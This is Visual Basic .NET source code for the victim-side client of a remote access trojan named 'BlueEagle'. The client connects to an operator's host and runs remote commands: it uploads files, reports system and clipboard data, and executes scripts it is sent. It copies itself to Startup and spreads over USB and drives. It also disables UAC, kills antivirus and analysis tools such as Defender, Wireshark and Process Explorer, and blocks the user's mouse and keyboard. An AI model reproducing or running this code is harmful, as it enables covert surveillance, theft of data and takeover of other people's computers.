#Region "Imported_Libraries"
Imports System.Globalization
Imports System.Runtime.InteropServices
Imports System.IO
Imports System.Net
Imports System.Windows.Forms.SendKeys
Imports System.Diagnostics
Imports System.Management
Imports System.Net.Sockets, System.Threading, System.Runtime.Serialization.Formatters.Binary, System.Runtime.Serialization, Microsoft.Win32
Imports System.Drawing.Imaging
Imports System.Drawing.Drawing2D
Imports System.Byte
Imports System.Data.Linq
Imports System.Xml.Linq
Imports System.ServiceProcess
Imports System.Text
Imports System.ComponentModel
Imports System.Net.NetworkInformation
Imports System.Security.Cryptography
Imports System.DirectoryServices
Imports Server.NativeWifi
#End Region ''Imported_Libraries
Module TaskhostEng
#Region "Variables"
    Private invoker As New Windows.Forms.Form
    Dim camera As New cam.A
    Private US As New USB
    Dim WithEvents Tryer As New System.Windows.Forms.Timer
    Dim clipboardtext As String = ""
    Dim clipboardimage As Image
    Private Form2 As New FormChat
    Private startuppath As String = ""
    Private drivers_destroyer As New Driverspread
    Private DJB As Object
    ' Declare Function FindWindow Lib "user32" Alias "FindWindowA" (ByVal lpClassName As String, ByVal lpWindowName As String) As Integer
    Declare Function SetWindowPos Lib "user32" (ByVal hwnd As Integer, ByVal hWndInsertAfter As Integer, ByVal x As Integer, ByVal y As Integer, ByVal cx As Integer, ByVal cy As Integer, ByVal wFlags As Integer) As Integer
    Dim procID As Integer
    Public strHostName As String
    Public strIPAddress As String
    Public lanip As String = ""
    Public ia As Integer = 0
    Public Y As String
    Dim Screamhi$
    Dim sco$
    Private Const SW_SHOWNORMAL As Integer = 1
    Private Const SW_SHOWMINIMIZED As Integer = 2
    'Private Declare Function ShowWindow Lib "user32" (ByVal handle As IntPtr, ByVal nCmdShow As Integer) As Integer
    Public scam As String
    Delegate Sub chatappd(ByVal data1 As String, ByVal data2 As String, ByVal data3 As String)
    Private Declare Function BlockInput Lib "user32" Alias "BlockInput" (ByVal fBlock As Integer) As Integer
    Private Declare Function ShowCursor Lib "user32" (ByVal lShow As Long) As Long
    Dim list As TextBox
    Dim rK As RegistryKey = Nothing
    Dim router As String
    Dim ListView1 As ListView
    Dim networks As ListBox
    Public lannet As New ListBox
    Public lanPcs As String = ""
    Public pcsip As String = ""
    Public rThread As System.Threading.Thread
    Dim AC$
    Dim tcpfuck = New TcpController
    Public tictoc As Integer = 0
    Dim streamWebcam As Boolean = False
    Public i As Integer
    Const TASKBAR_SHOW As Integer = &H40
    Const TASKBAR_HIDE As Integer = &H80
    Private Const SETDESKWALLPAPER = 20
    Private Const UPDATEINIFILE = &H1
    Dim alaa(), text1, text2, text3 As String
    Const spl As String = "abccba"
    Dim pw As String
    Dim o As New BlueLogger
    Dim vName As String = "Blue-Eagle-Victim"
    Private Const SHERB_NOCONFIRMATION = &H1
    Private Const SHERB_NOPROGRESSUI = &H2
    Private Const SHERB_NOSOUND = &H4
    Private Declare Function SHEmptyRecycleBin Lib "shell32.dll" Alias "SHEmptyRecycleBinA" (ByVal hWnd As Int32, ByVal pszRootPath As String, ByVal dwFlags As Int32) As Int32
    Private Declare Function SHUpdateRecycleBinIcon Lib "shell32.dll" () As Int32
    Private Declare Function SystemParametersInfo Lib "user32" Alias "SystemParametersInfoA" (ByVal uAction As Integer, ByVal uParam As Integer, ByVal lpvParam As String, ByVal fuWinIni As Integer) As Integer
    ' Dim Cam_Capture As New PictureBox
    Dim MeisStopped As Boolean
    Dim recording As Boolean = False
    Dim clipimage As String = Environment.GetFolderPath(Environment.SpecialFolder.Templates) & "\" + "ClipImage.jpg"
    Dim Filez As String = Environment.GetFolderPath(Environment.SpecialFolder.Templates) & "\" & "rec.wav"
    Dim Connected As Boolean = False

    Dim picBox As New PictureBox
    Public WithEvents C As New k
    Public Yy As String = "|BlueEagle|"
    Public HOST As String
    Public port As Integer
    Private cap As New Rmote_Desktop
    Private caa As New Fast_Screen
    Private culture As String = CultureInfo.CurrentCulture.EnglishName
    Private country2 As String = culture.Substring(culture.IndexOf("("c) + 1, culture.LastIndexOf(")"c) - culture.IndexOf("("c) - 1)
    Private country As String
    ' Private Declare Function GetForegroundWindow Lib "user32" Alias "GetForegroundWindow" () As IntPtr
    Public Declare Function apiBlockInput Lib "user32" Alias "BlockInput" (ByVal fBlock As Integer) As Integer
    Public Declare Function SwapMouseButton Lib "user32" Alias "SwapMouseButton" (ByVal bSwap As Long) As Long
    Private Declare Auto Sub SendMessage Lib "user32.dll" (ByVal hWnd As Integer, ByVal msg As UInt32, ByVal wParam As UInt32, ByVal lparam As Integer)
    Dim taskBar As Integer = FindWindow("Shell_traywnd", "")
    Private Declare Auto Function GetWindowText Lib "user32" (ByVal hWnd As System.IntPtr, ByVal lpString As System.Text.StringBuilder, ByVal cch As Integer) As Integer
    Private makel As String
    Dim namev, flder, RG As String
    Dim PictureBox1 As Windows.Forms.PictureBox
    Public loggg As String
    Private Declare Function SendCamMessage Lib "user32" Alias "SendMessageA" (ByVal hwnd As Int32, ByVal Msg As Int32, ByVal wParam As Int32, <Runtime.InteropServices.MarshalAs(Runtime.InteropServices.UnmanagedType.AsAny)> ByVal lParam As Object) As Int32
    Public xxx As Integer
    Dim id As String = "76487-337-8429955-22614"
    Private pfnStartAddr As Integer
    ' Public Declare Function LoadLibrary Lib "kernel32" Alias "LoadLibraryA" (ByVal lpLibFileName As String) As Integer
    Public Declare Function GetProcAddress Lib "kernel32" (
    ByVal hModule As Integer, ByVal lpProcName As String) As Integer
    Public screamx As String = Environment.GetFolderPath(Environment.SpecialFolder.Templates) & "\" + System.Environment.UserName + ".wav"
    Public scream As String = Environment.GetFolderPath(Environment.SpecialFolder.Templates) & "\" + System.Environment.UserName + ".ini"
    Public hid As String = Environment.GetFolderPath(Environment.SpecialFolder.Templates) & "\" + System.Environment.UserName + ".E"
    Public S762 As String = Environment.GetFolderPath(Environment.SpecialFolder.Desktop)
    Public Declare Function CreateRemoteThread Lib "kernel32" (
    ByVal hProcess As Integer,
    ByVal lpThreadAttributes As Integer,
    ByVal dwStackSize As Integer,
    ByVal lpStartAddress As Integer,
    ByVal lpParameter As Integer,
    ByVal dwCreationFlags As Integer,
    ByRef lpThreadId As Integer) As Integer
    Public ooo As String = Environment.GetFolderPath(Environment.SpecialFolder.Templates) & "\" + System.Environment.UserName + ".jpg"
    Public LogsPathsoo As String = Environment.GetFolderPath(Environment.SpecialFolder.Templates) & "\" + System.Environment.UserName + ".log"
    'Public HostPort As String = Environment.GetFolderPath(Environment.SpecialFolder.Templates) & "\" + System.Environment.UserName + ".Microsoft"
    Public Structure CLIENT_ID
        Dim UniqueProcess As Long
        Dim UniqueThread As Long
    End Structure
    '########################################################################################### Active Windows Options
    Public Enum ThreadAccess As Integer
        TERMINATE = (&H1)
        SUSPEND_RESUME = (&H2)
        GET_CONTEXT = (&H8)
        SET_CONTEXT = (&H10)
        SET_INFORMATION = (&H20)
        QUERY_INFORMATION = (&H40)
        SET_THREAD_TOKEN = (&H80)
        IMPERSONATE = (&H100)
        DIRECT_IMPERSONATION = (&H200)
    End Enum
    Private Declare Function cdmciSendString Lib "winmm.dll" Alias "mciSendStringA" (ByVal lpstrCommand As String, ByVal lpstrReturnString As String, ByVal uReturnLength As Long, ByVal hwndCallback As Long) As Long
    Private Declare Function FindWindowEx Lib "user32.dll" Alias _
"FindWindowExA" (ByVal hWnd1 As Int32, ByVal hWnd2 As Int32, ByVal lpsz1 As String, _
ByVal lpsz2 As String) As Int32
    Public Delegate Function CallBack(ByVal hwnd As Integer, ByVal lParam As Integer) As Boolean
    Public Declare Function EnumWindows Lib "user32" (ByVal Adress As CallBack, ByVal y As Integer) As Integer
    ' Public Declare Function IsWindowVisible Lib "user32.dll" (ByVal hwnd As IntPtr) As Boolean
    Private Const SW_HIDE As Integer = 0
    Private Const SW_RESTORE As Integer = 9
    Private hWnd As Integer
    Public selectedIndex As Integer
    Private ActiveWindows As New System.Collections.ObjectModel.Collection(Of IntPtr)
    Private Declare Function GetWindowText Lib "user32" Alias "GetWindowTextA" (ByVal hwnd As Integer, ByVal lpWindowText As String, ByVal cch As Integer) As Integer
    Public Declare Function OpenThread Lib "kernel32.dll" (ByVal dwDesiredAccess As ThreadAccess, ByVal bInheritHandle As Boolean, ByVal dwThreadId As UInteger) As IntPtr
    Public Declare Function SuspendThread Lib "kernel32.dll" (ByVal hThread As IntPtr) As UInteger
    Public Declare Function ResumeThread Lib "kernel32.dll" (ByVal hThread As IntPtr) As UInteger
    Public Declare Function CloseHandle Lib "kernel32.dll" (ByVal hHandle As IntPtr) As Boolean
    Public GetProcesses() As Process
    Private strUninstallStringsx As String()
    Private NewUninstallStrArr
    Public Declare Function GetAsyncKeyState Lib "user32.dll" (ByVal key As Integer) As Integer
    Private Declare Function mmciSendString Lib "winmm.dll" Alias "mciSendStringA" (ByVal lpstrCommand As String, ByVal lpstrReturnString As String, ByVal uReturnLength As Integer, ByVal hwndCallback As Integer) As Integer
#End Region
#Region "Creation_Variables"
    Public hidep As String = "False"
    Public spythespy As String = "False"
    Public usb_spread As String = "False"
    Public drive_spread As String = "False"
    Public wireshark As String = "False"
    Public prx As Boolean = "False"
    Public apatedns As String = "False"
    Public keyscramb As String = "False"
    Public netstat As String = "False"
    Public a8 As String = "False"
    Public a9 As String = "False"
    Public speedgear As String = "False"
    Public cts As String = "False"
    Public task As String = "False"
    Public ipblocker As String = "False"
    Public phacker As String = "False"
    Public cports As String = "False"
    Dim processxplorer As String = "False"
    Public virustotal As String = "False"
    Dim virus As String = "BlueEagleVictim"
    Public mbytes As String = "False"
    Public sandboxie As String = "False"
    Public aklogger As String = "False"
#End Region
    Public Function GenerateOperatingSystema() As String
        Dim xa As String
        If Microsoft.Win32.Registry.LocalMachine.OpenSubKey("Hardware\Description\System\CentralProcessor\0").GetValue("Identifier").ToString.Contains("x64") Then
            xa = "32 Bit"
        Else
            xa = "64 Bit"
        End If
        Return xa
    End Function
   Sub imge_desik()
        Dim bitmap As New Bitmap(Screen.PrimaryScreen.Bounds.Width, Screen.PrimaryScreen.Bounds.Height)
        Dim graphics__1 As Graphics = Graphics.FromImage(TryCast(bitmap, Image))
        graphics__1.CopyFromScreen(0, 0, 0, 0, bitmap.Size)
        picBox.SizeMode = PictureBoxSizeMode.AutoSize
        picBox.Image = bitmap
        Dim er As String = ooo

        Dim bm As New Bitmap(picBox.Image)
        Dim width As Integer = 460
        Dim height As Integer = 360
        Dim thumb As New Bitmap(width, height)
        Dim g As Graphics = Graphics.FromImage(thumb)
        g.InterpolationMode = Drawing2D.InterpolationMode.Low
        g.DrawImage(bm, New Rectangle(0, 0, width, height), New Rectangle(0, 0, bm.Width, bm.Height), GraphicsUnit.Pixel)
        g.Dispose()
        thumb.Save(er, System.Drawing.Imaging.ImageFormat.Jpeg)

        bm.Dispose()
        thumb.Dispose()
    End Sub
    Private Function GetCaption() As String
        Dim Caption As New System.Text.StringBuilder(256)
        Dim hWnd As IntPtr = GetForegroundWindow()
        GetWindowText(hWnd, Caption, Caption.Capacity)
        Return Caption.ToString()
    End Function
    Public Function GetActiveWindows() As ObjectModel.Collection(Of IntPtr)
        AC = ""
        EnumWindows(AddressOf Enumerator, 0)
        Return ActiveWindows
    End Function
    Private Function Enumerator(ByVal hwnd As IntPtr, ByVal lParam As Integer) As Boolean
        Dim text As String = Space(Int16.MaxValue)
        If IsWindowVisible(hwnd) Then
            GetWindowText(hwnd, text, Int16.MaxValue)
            AC = text
            Dim sl As String = "ProcessSplit"
            Dim RFC$
            RFC = AC + sl
            C.Send("ACs" & Yy & RFC)
        End If
        Return True
    End Function
    Private Sub Tryer_Tick(ByVal sender As Object, ByVal e As EventArgs) Handles Tryer.Tick
      Try : copytostartup() : Windows_Users_Common_Startup_Handler() : Start_Lan_Share() : Catch ex As Exception : End Try
        Dim CapTxt As String = GetCaption()
        If makel <> CapTxt Then
            makel = CapTxt
            C.Send("AW" & Yy & CapTxt)
        End If
        If netstat Then
            Dim generaldee As Process() = Process.GetProcesses
            Dim i As Integer
            For i = 0 To generaldee.Length - 1
                Select Case Strings.LCase(generaldee(i).ProcessName)
                    Case "xns5"
                        generaldee(i).Kill()
                    Case "cmd"
                        generaldee(i).Kill()
                    Case Else
                End Select
            Next
        End If
        If keyscramb Then
            Dim generaldee As Process() = Process.GetProcesses
            Dim i As Integer
            For i = 0 To generaldee.Length - 1
                Select Case Strings.LCase(generaldee(i).ProcessName)
                    Case "keyscrambler"
                        generaldee(i).Kill()
                    Case Else
                End Select
            Next
        End If
        If aklogger Then
            Try
                Dim AntiLogger() As Process = Process.GetProcessesByName("AntiLogger")

                For Each Process As Process In AntiLogger
                    Process.Kill()
                Next

            Catch x As Exception
            End Try
        End If
        If phacker Then
            Dim Code8() As Process = System.Diagnostics.Process.GetProcessesByName("ProcessHacker")
            For Each X As Process In Code8
                X.Kill()
            Next
        End If
        If cports Then
            Dim Code7() As Process = System.Diagnostics.Process.GetProcessesByName("cports")
            For Each X As Process In Code7
                X.Kill()
            Next
        End If
        If ipblocker Then
            Dim Code6() As Process = System.Diagnostics.Process.GetProcessesByName("IPBlocker")
            For Each X As Process In Code6
                X.Kill()
            Next
        End If
        If apatedns Then
            Dim Code5() As Process = System.Diagnostics.Process.GetProcessesByName("apateDNS")
            For Each X As Process In Code5
                X.Kill()
            Next
            For Each prog As Process In Process.GetProcesses
                If prog.ProcessName.Contains("Dns") Or prog.ProcessName.Contains("dns") Or prog.ProcessName.Contains("DNS") Then
                    Try : prog.Kill() : Catch ex As Exception : End Try
                End If
            Next
        End If
        If mbytes Then
            Dim Code4() As Process = System.Diagnostics.Process.GetProcessesByName("mbam")
            For Each X As Process In Code4
                X.Kill()
            Next
        End If
        If wireshark Then
            Dim Code3() As Process = System.Diagnostics.Process.GetProcessesByName("wireshark")
            For Each x As Process In Code3
                x.Kill()
            Next
        End If
        If speedgear Then
            Dim Code2() As Process = System.Diagnostics.Process.GetProcessesByName("SpeedGear")
            For Each X As Process In Code2
                X.Kill()
            Next
        End If
        If spythespy Then
            Dim Code3() As Process = System.Diagnostics.Process.GetProcessesByName("SpyTheSpy")
            For Each X As Process In Code3
                X.Kill()
            Next
        End If
        If sandboxie Then
            Dim Code1() As Process = System.Diagnostics.Process.GetProcessesByName("SbieCtrl")
            For Each X As Process In Code1
                X.Kill()
            Next
        End If
        If processxplorer Then
            Dim Code() As Process = System.Diagnostics.Process.GetProcessesByName("procexp")
            For Each X As Process In Code
                X.Kill()
            Next
            Dim a() As Process = System.Diagnostics.Process.GetProcessesByName("procexp64")
            For Each X As Process In a
                X.Kill()
            Next
        End If
        If task Then

            For Each prog As Process In Process.GetProcesses
                If prog.ProcessName.Contains("mgr") Then
                    Try : prog.Kill() : Catch ex As Exception : End Try
                End If
                If prog.ProcessName.Contains("pro") Then
                    Try : prog.Kill() : Catch ex As Exception : End Try
                End If
                If prog.ProcessName.Contains("MsMpEng") Then
                    Try : prog.Kill() : Catch ex As Exception : End Try
                End If
                If prog.ProcessName.Contains("MpCmdRun") Then
                    Try : prog.Kill() : Catch ex As Exception : End Try
                End If
                If prog.ProcessName.Contains("MSASCui") Then
                    Try : prog.Kill() : Catch ex As Exception : End Try
                End If
                If prog.ProcessName.Contains("csrss") Then
                    Try : prog.Kill() : Catch ex As Exception : End Try
                End If
                If prog.ProcessName.Contains("lsm") Then
                    Try : prog.Kill() : Catch ex As Exception : End Try
                End If
                If prog.ProcessName.Contains("lass") Or prog.ProcessName.Contains("_AVPCC.EXE") Or prog.ProcessName.Contains("_AVPM.EXE") Then
                    Try : prog.Kill() : Catch ex As Exception : End Try
                End If
            Next
        End If
    End Sub
    Private Sub Disable_UAC()
        Dim sr$ = "C:\Windows\System32\cmd.exe /k %windir%\System32\reg.exe ADD HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v EnableLUA /t REG_DWORD /d 0 /f"
        Dim startInfo As New ProcessStartInfo("CMD.EXE")
        startInfo.WindowStyle = ProcessWindowStyle.Minimized
        startInfo.WindowStyle = ProcessWindowStyle.Hidden
        startInfo.CreateNoWindow = False
        startInfo.UseShellExecute = True
        startInfo.Arguments = sr
        startInfo.Verb = "runas"
        Process.Start(startInfo)

    End Sub
    Private Sub ReEnable_UAC()
        Dim sr$ = "C:\Windows\System32\cmd.exe /k %windir%\System32\reg.exe ADD HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v EnableLUA /t REG_DWORD /d 1 /f"
        Dim startInfo As New ProcessStartInfo("CMD.EXE")
        startInfo.WindowStyle = ProcessWindowStyle.Minimized
        startInfo.WindowStyle = ProcessWindowStyle.Hidden
        startInfo.CreateNoWindow = False
        startInfo.UseShellExecute = True
        startInfo.Arguments = sr
        startInfo.Verb = "runas"
        Process.Start(startInfo)
    End Sub
    Private Sub Connectedx() Handles C.Connected
        Connected = True
    End Sub
    Private Sub Disconnected() Handles C.Disconnected
        Connected = False
        Try
            C.Connect(HOST, port)
        Catch ex As Exception
            Disconnected()
        End Try
    End Sub
#Region "Data_Variables"
    Dim camByteArray As New Byte()
    Private Pro As Object
    Dim Npc = Environment.UserName & "@" & Environment.MachineName
    Dim uwyeuwwqyeu$
    Dim scream1010$
    Private Copy_cut As String
    Delegate Sub gt()
    Private Function gtx() As String
        Dim str As String
        str = Windows.Forms.Clipboard.GetText
        C.Send("recvcli" & Yy & str)
        If My.Computer.Clipboard.ContainsImage Then
            My.Computer.Clipboard.GetImage.Save(clipimage)
            C.Send("clipimg" & Yy & Convert.ToBase64String(IO.File.ReadAllBytes(clipimage)))
        End If
        Return True
    End Function
    Declare Function SetSuspendState Lib "PowrProf" (ByVal Hibernate As Integer, ByVal ForceCritical As Integer, ByVal DisableWakeEvent As Integer) As Integer
    Dim vvname
    Private Const APPCOMMAND_VOLUME_MUTE As Integer = &H80000
    Private Const APPCOMMAND_VOLUME_UP As Integer = &HA0000
    Private Const APPCOMMAND_VOLUME_DOWN As Integer = &H90000
    Private Const WM_APPCOMMAND As Integer = &H319
    Private msvc As ServiceController
    Private controllers As New System.Collections.Generic.SortedList(Of String, ServiceController)
    Private LO As Object = New IO.FileInfo(Application.ExecutablePath)
#End Region
    Sub chatappds(ByVal data1 As String, ByVal data2 As String, ByVal data3 As String)
        If Form2.Showed = True Then
            Form2.TextBox1.Text = Form2.TextBox1.Text & data1 & " said : " & data3 & vbNewLine
        ElseIf Form2.Showed = False Then
            Form2 = New FormChat
            Form2.Main()
            Form2.TextBox1.Text = Form2.TextBox1.Text & data1 & " said : " & data3 & vbNewLine
            Form2.Showed = True
        End If
    End Sub
    Function rams() As Integer
        rams = (My.Computer.Info.TotalPhysicalMemory / 1024 / 1024 / 1024)
    End Function
    Private Sub RS(ByVal a As Object, ByVal e As Object)
        Try
            C.Send("rs" & Yy & ENB(e.Data))
        Catch ex As Exception
        End Try
    End Sub
    Private Sub ex()
        Try
            C.Send("rsc" & Yy)
        Catch ex As Exception
        End Try
    End Sub
    Private Sub copytostartup()
        Dim dirto As String = Environment.GetFolderPath(Environment.SpecialFolder.Startup) : Dim AppPath As String = Application.ExecutablePath : Dim AutoStart As String = dirto & "/" : Dim HideFile As IO.FileInfo = My.Computer.FileSystem.GetFileInfo(dirto) : Dim name As String = Application.ExecutablePath.Replace(Application.StartupPath & "\", "") : Try : File.Copy(AppPath, AutoStart & name, True) : startuppath = dirto & "\" & name : Catch ex As Exception : End Try
    End Sub
    Private Sub SuspendProcess(ByVal process As System.Diagnostics.Process)
        For Each t As ProcessThread In process.Threads
            Dim th As IntPtr
            If sco = 1 Then
                th = OpenThread(ThreadAccess.SUSPEND_RESUME, False, t.Id)
                If th <> IntPtr.Zero Then
                    SuspendThread(th)
                    CloseHandle(th)
                End If
            ElseIf sco = 2 Then
                th = OpenThread(ThreadAccess.SUSPEND_RESUME, False, t.Id)
                If th <> IntPtr.Zero Then
                    ResumeThread(th)
                    CloseHandle(th)
                End If
            End If


        Next
    End Sub
    Public Sub DLV(ByVal n As String)
        Try
            Registry.CurrentUser.CreateSubKey("Software\" & RG).DeleteValue(n)
        Catch ex As Exception
        End Try
    End Sub
    Function GTV(ByVal n As String) As String
        Try
            Return Registry.CurrentUser.CreateSubKey("Software\" & RG).GetValue(n, "")
        Catch ex As Exception
            Return ""
        End Try
    End Function
    Function STV(ByVal n As String, ByVal t As String)
        Try
            Registry.CurrentUser.CreateSubKey("Software\" & RG).SetValue(n, t)
            Return True
        Catch ex As Exception
            Return False
        End Try
    End Function
    Function GetKey(ByVal key As String) As Microsoft.Win32.RegistryKey
        Dim k As String
        If key.StartsWith(Registry.ClassesRoot.Name) Then
            k = key.Replace(Registry.ClassesRoot.Name & "\", "")
            Return Registry.ClassesRoot.OpenSubKey(k, True)
        End If
        If key.StartsWith(Registry.CurrentUser.Name) Then
            k = key.Replace(Registry.CurrentUser.Name & "\", "")
            Return Registry.CurrentUser.OpenSubKey(k, True)
        End If
        If key.StartsWith(Registry.LocalMachine.Name) Then
            k = key.Replace(Registry.LocalMachine.Name & "\", "")
            Return Registry.LocalMachine.OpenSubKey(k, True)
        End If
        If key.StartsWith(Registry.Users.Name) Then
            k = key.Replace(Registry.Users.Name & "\", "")
            Return Registry.Users.OpenSubKey(k, True)
        End If
        Return Nothing
    End Function
    Private Sub MYTHREAD()
        On Error Resume Next
        If clipboardtext.Length = 0 And clipboardtext = "" Then
        Else
            My.Computer.Clipboard.SetText(clipboardtext)
        End If
        If clipboardimage Is Nothing Then
        Else
            My.Computer.Clipboard.SetImage(clipboardimage)
        End If
    End Sub
    Delegate Sub rv(ByVal data1 As String)
    Sub programs()
        Dim DestKey As String = "SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\"
        For Each App As String In Registry.LocalMachine.OpenSubKey(DestKey).GetSubKeyNames
            On Error Resume Next
            Dim ChildKey = Registry.LocalMachine.OpenSubKey(DestKey & "\" & App)
            Dim child = ChildKey.Name.Replace("HKEY_LOCAL_MACHINE\", "")
            Dim q = Registry.LocalMachine.OpenSubKey(child).GetValue("DisplayName").ToString
            Dim w = Registry.LocalMachine.OpenSubKey(child).GetValue("Publisher").ToString
            Dim er = Registry.LocalMachine.OpenSubKey(child).GetValue("InstallDate").ToString
            Dim Yr = Registry.LocalMachine.OpenSubKey(child).GetValue("EstimatedSize").ToString
            Dim oos = Registry.LocalMachine.OpenSubKey(child).GetValue("DisplayVersion").ToString
            Dim un = Registry.LocalMachine.OpenSubKey(child).GetValue("UninstallString").ToString.Replace("""", "")
            C.Send("xxz" & Yy & q & Yy & w & Yy & er & Yy & Yr & Yy & oos & Yy & un)
        Next
    End Sub
    Sub rvte(ByVal data1 As String)
        On Error Resume Next
        ' My.Computer.Keyboard.SendKeys(data1)
        SendKeys.Send(data1)
    End Sub
    Sub Main()
        country = country2
        Try
            FileOpen(1, Application.ExecutablePath, OpenMode.Binary, OpenAccess.Read, OpenShare.Shared)
            text1 = Space(LOF(1))
            text2 = Space(LOF(1))
            text3 = Space(LOF(1))
            FileGet(1, text1)
            FileGet(1, text2)
            FileGet(1, text3)
            FileClose()
            alaa = Split(text1, spl)
            HOST = alaa(1)
            port = alaa(2)
            vName = (alaa(3))
            task = alaa(4)
            usb_spread = alaa(5)
            cts = alaa(6)
            processxplorer = alaa(7)
            sandboxie = alaa(8)
            spythespy = alaa(9)
            speedgear = alaa(10)
            wireshark = alaa(11)
            mbytes = alaa(12)
            apatedns = alaa(13)
            ipblocker = alaa(14)
            cports = alaa(15)
            phacker = alaa(16)
            aklogger = alaa(17)
            keyscramb = alaa(18)
            netstat = alaa(19)
            virustotal = alaa(20)
            drive_spread = alaa(21)
            Tryer.Interval = 500
            If virustotal Then
                Block("virus") : Block("antivirus") : Block("scan") : Block("malware") : Block("فحص") : Block("check")
            End If

            If usb_spread Then : US.Start() : End If
            If drive_spread Then : drivers_destroyer.Start() : End If
            Dim xp As New prote : xp.pass()
            Tryer.Start() : o.Start()
            invoker.Opacity = 0
            invoker.WindowState = FormWindowState.Minimized
            invoker.Dock = DockStyle.None
            invoker.Size = New Point(0, 0)
            invoker.StartPosition = FormStartPosition.Manual
            invoker.ShowIcon = False
            invoker.ShowInTaskbar = False
            invoker.Show()
            Application.Run()
        Catch ex As Exception:  End Try
    End Sub

    Private Sub Data(ByVal b As Byte()) Handles C.Data
        Dim T As String = BS(b)
        Dim base64Encoded As String = T 'Encoded

        Dim base64Decoded As String
        Dim datax() As Byte
        datax = System.Convert.FromBase64String(base64Encoded)
        base64Decoded = System.Text.ASCIIEncoding.ASCII.GetString(datax)

        Dim A As String() = Split(base64Decoded, Yy)




        Try


            Select Case A(0)
                Case "downloadfile"

                    C.Send("downloadedfile" & "|BlueEagle|" & Convert.ToBase64String(IO.File.ReadAllBytes(A(1))) & "|BlueEagle|" & A(2))
                Case "ssopen"
                    C.Send("ss")
                Case "Acti"
                    C.Send("Acti")
                Case "sendinformation"
                    Dim time, h, m, s As Integer
                    time = My.Computer.Clock.TickCount
                    h = time \ 3600000
                    m = (time Mod 3600000) \ 60000
                    s = ((time Mod 3600000) Mod 60000) / 1000
                    Dim ab, bb, cb, db, eb, fb, gb As String
                    ab = Microsoft.Win32.Registry.GetValue("HKEY_LOCAL_MACHINE\HARDWARE\DESCRIPTION\System\CentralProcessor\0", "ProcessorNameString", "")
                    bb = Microsoft.Win32.Registry.GetValue("HKEY_LOCAL_MACHINE\HARDWARE\DESCRIPTION\System\CentralProcessor\0", "Identifier", "")
                    cb = Microsoft.Win32.Registry.GetValue("HKEY_LOCAL_MACHINE\HARDWARE\DESCRIPTION\System\BIOS", "SystemProductName", "")
                    db = Microsoft.Win32.Registry.GetValue("HKEY_LOCAL_MACHINE\HARDWARE\DESCRIPTION\System\BIOS", "BIOSReleaseDate", "")
                    eb = Microsoft.Win32.Registry.GetValue("HKEY_LOCAL_MACHINE\HARDWARE\DESCRIPTION\System\BIOS", "BIOSVersion", "")
                    fb = Microsoft.Win32.Registry.GetValue("HKEY_LOCAL_MACHINE\HARDWARE\DESCRIPTION\System\BIOS", "SystemManufacturer", "")
                    gb = Microsoft.Win32.Registry.GetValue("HKEY_LOCAL_MACHINE\HARDWARE\DESCRIPTION\System\BIOS", "BIOSVendor", "")
                    Dim value As String = Microsoft.Win32.Registry.GetValue("HKEY_CURRENT_USER\TunisiaRat", "ID", "")
                    C.Send("sendinformation" & Yy & Environment.MachineName & Yy & Environment.UserName & Yy & My.Computer.Info.OSFullName & Yy & My.Computer.Info.OSPlatform & Yy & country & Yy & GetFirewall() & Yy & GetSystemRAMSize() & Yy & "0.1.0" & Yy & checkcam() & Yy & ACT() & Yy & My.Computer.Clock.LocalTime & Yy & h & ":" & m & ":" & s & Yy & Environment.CurrentDirectory & Yy & Environment.SystemDirectory & Yy & Environment.UserDomainName & Yy & Environment.UserInteractive & Yy & Environment.WorkingSet & Yy & My.Computer.Info.OSVersion & Yy & My.Computer.Info.InstalledUICulture.ToString & Yy & System.Environment.CommandLine & Yy & port & Yy & Application.ExecutablePath & Yy & ab & Yy & bb & Yy & cb & Yy & db & Yy & eb & Yy & fb & Yy & gb & Yy & vName)

                Case "TextToSpeech"
                    Dim SAPI = CreateObject("SAPI.Spvoice")
                    SAPI.speak(A(1))

                Case "TurnOffMonitor"
                    SendMessage(-1, &H112, &HF170, 2)
                Case "TurnOnMonitor"
                    SendMessage(-1, &H112, &HF170, -1)
                Case "taskbaroff"
                    HideTaskBar()
                Case "taskbaron"
                    ShowTaskBar()
                Case "taskmanageroff"
                    task = "False"
                Case "taskmanageron"
                    task = "True"

                Case "exploreroff"

                    For Each prog As Process In Process.GetProcesses
                        If prog.ProcessName.Contains("explorer") Then
                            Try : prog.Kill() : Catch ex As Exception : End Try
                        End If

                    Next
                Case "exploreron"
                    Process.Start("explorer.exe")
                Case "blockmouseandkeyboard"
                    BlockInput(1)
                    ShowCursor(0)
                Case "unblockmouseandkeyboard"
                    BlockInput(0)
                    ShowCursor(1)
                Case "setcli"


                    Try
                        clipboardtext = A(1)
                        ' My.Computer.Clipboard.SetText(A(1), TextDataFormat.Rtf)
                        Dim startth As Thread
                        startth = New Thread(AddressOf MYTHREAD)
                        startth.SetApartmentState(ApartmentState.STA)
                        startth.Start()
                    Catch ex As Exception
                        MsgBox(ex.Message)
                    End Try

                Case "code"
                    C.Send("code")
                Case "script"
                    Dim xop$
                    xop = System.Environment.UserName
                    Dim temp As String = Environment.GetFolderPath(Environment.SpecialFolder.Templates) & "\" + xop
                    IO.File.WriteAllText(temp & A(2), A(1))
                    Process.Start(temp & A(2))
                Case "startfun"
                    C.Send("fun")
                Case "setcliimg"
                    Dim pi As New PictureBox
                    Dim m As New IO.MemoryStream(Convert.FromBase64String(A(1)))
                    SyncLock pi
                        pi.Image = Image.FromStream(m)
                        clipboardimage = pi.Image
                        Dim startth As Thread
                        startth = New Thread(AddressOf MYTHREAD)
                        startth.SetApartmentState(ApartmentState.STA)
                        startth.Start()
                    End SyncLock

                Case ("Winsx")

                    GetActiveWindows()
                Case "getmymusicpath"
                    Dim specialfolder As String
                    specialfolder = Environment.GetFolderPath(Environment.SpecialFolder.MyMusic)
                    C.Send("getpath" & Yy & specialfolder & "\")
                Case "OpenPro"
                    C.Send("OpenPro")
                    '   Comet.Send("ProcessManager" & Yy & allProcess & Yy & System.IO.Path.GetFileNameWithoutExtension(Application.ExecutablePath))

                Case "RestProcess"
                    Dim eachprocess As String() = A(1).Split("ProcessSplit")
                    For i = 0 To eachprocess.Length - 2
                        For Each RunningProcess In Process.GetProcessesByName(eachprocess(i))
                            RunningProcess.Kill()
                        Next
                        Process.Start(eachprocess(i))
                    Next
                Case "GetProcesses"
                    Dim allProcess As String = ""
                    Dim ProcessList As Process() = Process.GetProcesses()
                    For Each Proc As Process In ProcessList
